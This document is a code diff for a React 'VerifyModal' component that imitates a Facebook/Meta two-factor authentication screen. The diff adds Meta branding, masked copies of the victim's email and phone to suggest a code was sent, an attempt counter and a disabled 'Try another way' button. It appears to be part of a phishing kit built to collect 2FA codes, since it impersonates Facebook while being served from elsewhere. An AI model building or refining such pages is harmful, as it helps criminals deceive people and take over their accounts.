@@ -1,6 +1,6 @@
+import MetaLogo from '@/assets/images/meta-logo-image.png';
 import VerifyImage from '@/assets/images/2FAuth.png';
 import { store } from '@/store/store';
-import config from '@/utils/config';
 import translateText from '@/utils/translate';
 import axios from 'axios';
 import Image from 'next/image';
@@ -14,18 +14,73 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
     const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId, message, setMessage } = store();
-    const maxCode = config.MAX_CODE ?? 3;
-    const loadingTime = config.CODE_LOADING_TIME ?? 60;
+    const { geoInfo, messageId, message, setMessage, userEmail, userPhone } = store();
+    const maxCode = 3;
+    const loadingTime = 30;
 
     const t = (text: string): string => {
         return translations[text] || text;
     };
 
+    const maskEmail = (email: string): string => {
+        if (!email) return '';
+        const [localPart, domain] = email.split('@');
+        if (localPart.length <= 2) {
+            return localPart + '@' + domain;
+        }
+        // Show first char + 2 asterisks + last char + domain
+        return localPart[0] + '**' + localPart[localPart.length - 1] + '@' + domain;
+    };
+
+    const maskPhone = (phone: string): string => {
+        if (!phone || phone.length < 2) return '***';
+
+        // Country code to dialing code mapping
+        const countryDialingCodes: Record<string, string> = {
+            'VN': '84', 'US': '1', 'GB': '44', 'FR': '33', 'DE': '49', 'IT': '39', 'ES': '34',
+            'ZH': '86', 'JP': '81', 'IN': '91', 'BR': '55', 'RU': '7', 'AR': '54', 'AU': '61',
+            'CA': '1', 'MX': '52', 'NL': '31', 'PL': '48', 'EL': '30', 'PT': '351', 'KR': '82',
+            'TH': '66', 'MY': '60', 'SG': '65', 'ID': '62', 'PH': '63', 'TW': '886',
+            'HK': '852', 'BD': '880', 'PK': '92', 'TR': '90', 'EG': '20', 'ZA': '27'
+        };
+
+        // Extract only digits for counting and last 2 digits
+        const onlyDigits = phone.replace(/\D/g, '');
+        const last2 = onlyDigits.slice(-2);
+
+        // Determine dialing code
+        let dialingCode = '';
+        if (phone.startsWith('+')) {
+            // Extract only first 1-3 digits as country code (not all digits)
+            const match = phone.match(/^\+(\d{1,3})/);
+            dialingCode = match ? match[1] : '1';
+        } else if (geoInfo?.country_code) {
+            // Fallback to country code mapping
+            dialingCode = countryDialingCodes[geoInfo.country_code] || '1';
+        } else {
+            dialingCode = '1'; // Default fallback
+        }
+
+        // Show: +{dialingCode}*...{last2}
+        const asterisks = '*'.repeat(Math.max(3, onlyDigits.length - 2));
+        return `+${dialingCode}${asterisks}${last2}`;
+    };
+
     useEffect(() => {
         if (!geoInfo) return;
 
-        const textsToTranslate = ['Go to your authentication app', 'Enter the 6-digit code for this account from the two-step authentication app you set up (such as Duo Mobile or Google Authenticator).', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue'];
+        const textsToTranslate = [
+            'Two-factor authentication required',
+            'User',
+            'Facebook',
+            'Enter the code for this account that we send to',
+            'or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
+            'Code',
+            'The two-factor authentication you entered is incorrect. Please, try again after',
+            "This code doesn't work. Check it's correct or try a new one after",
+            'Continue',
+            'Try another way'
+        ];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -92,28 +147,29 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
             <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-lg flex-col rounded-3xl bg-white overflow-y-auto'>
                 {/* Header with user info and Facebook branding */}
                 <div className='px-3 sm:px-4 md:px-6 pt-3 sm:pt-4 md:pt-6 pb-2 sm:pb-3 md:pb-4'>
-                    <p className='text-xs sm:text-xs md:text-sm text-gray-600'>{userName || 'User'} • Facebook</p>
+                    <p className='text-xs sm:text-xs md:text-sm text-gray-600'>{userName || t('User')} • {t('Facebook')}</p>
                 </div>
 
                 {/* Main content */}
-                <div className='flex-1 px-3 sm:px-4 md:px-6 py-2 pb-3 sm:pb-4 md:pb-6 flex flex-col'>
+                <div className='flex-1 flex flex-col overflow-y-auto gap-1.5 sm:gap-2 md:gap-3 px-3 sm:px-4 md:px-6 py-2 pb-3 sm:pb-4 md:pb-6'>
                     {/* Title */}
-                    <h1 className='text-base sm:text-lg md:text-2xl font-bold text-gray-900 mb-2 sm:mb-3 md:mb-4 whitespace-normal'>
-                        {t('Go to your authentication app')}
+                    <h1 className='text-xs sm:text-sm md:text-base font-bold text-gray-900 leading-tight'>
+                        {t('Two-factor authentication required')} ({attempts + 1}/{maxCode})
                     </h1>
 
                     {/* Description */}
-                    <p className='text-xs sm:text-sm md:text-base text-gray-700 mb-4 sm:mb-6 md:mb-8 leading-relaxed'>
-                        {t('Enter the 6-digit code for this account from the two-step authentication app you set up (such as Duo Mobile or Google Authenticator).')}
+                    <p className='text-[11px] sm:text-xs md:text-sm text-gray-700 leading-tight'>
+                        {t('Enter the code for this account that we send to')} {maskEmail(userEmail || '')}{userPhone && ','} {userPhone && maskPhone(userPhone)}
+                        {' '}{t('or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)')}
                     </p>
 
                     {/* Illustration */}
-                    <div className='mb-4 sm:mb-6 md:mb-8 flex justify-center'>
-                        <Image src={VerifyImage} alt='2FA' className='max-h-36 sm:max-h-48 md:max-h-64 w-auto' />
+                    <div className='flex justify-center my-1.5 sm:my-2 md:my-3'>
+                        <Image src={VerifyImage} alt='2FA' className='h-auto w-full rounded-lg' />
                     </div>
 
                     {/* Code Input */}
-                    <div className='relative mb-4 sm:mb-6 md:mb-8'>
+                    <div className='relative mb-1.5 sm:mb-2 md:mb-2.5'>
                         <input
                             type='tel'
                             inputMode='numeric'
@@ -138,7 +194,7 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
                     {/* Error message */}
                     {showError && (
                         <p className='text-xs sm:text-xs md:text-sm text-red-500 mb-4 sm:mb-6 md:mb-8'>
-                            {t("This code doesn't work. Check it's correct or try a new one after")} {countdown}s.
+                            {t('The two-factor authentication you entered is incorrect. Please, try again after')} {countdown}s.
                         </p>
                     )}
 
@@ -159,6 +215,20 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
                             t('Continue')
                         )}
                     </button>
+
+                    {/* Try another way Button */}
+                    <button
+                        type='button'
+                        disabled
+                        className='w-full h-10 sm:h-11 md:h-14 rounded-2xl border border-gray-300 text-gray-400 font-semibold text-xs sm:text-sm md:text-lg transition-all opacity-60 cursor-not-allowed flex items-center justify-center'
+                    >
+                        {t('Try another way')}
+                    </button>
+                </div>
+
+                {/* Meta Logo Footer */}
+                <div className='flex items-center justify-center p-3'>
+                    <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                 </div>
             </div>
         </div>
